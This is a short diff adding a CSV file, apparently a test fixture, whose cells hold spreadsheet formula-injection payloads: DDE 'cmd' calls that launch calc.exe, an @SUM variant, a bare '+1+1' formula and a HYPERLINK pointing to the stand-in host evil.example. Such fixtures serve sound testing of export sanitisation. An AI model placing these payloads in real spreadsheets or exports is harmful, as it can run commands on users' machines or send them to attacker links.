@@ -1,0 +1,5 @@
+Nome,Valor
+=cmd|'/c calc.exe'!A1,a
+@SUM(1+1)*cmd|'/c calc'!A1,b
++1+1,c
+=HYPERLINK("http://evil.example/x","clique"),d
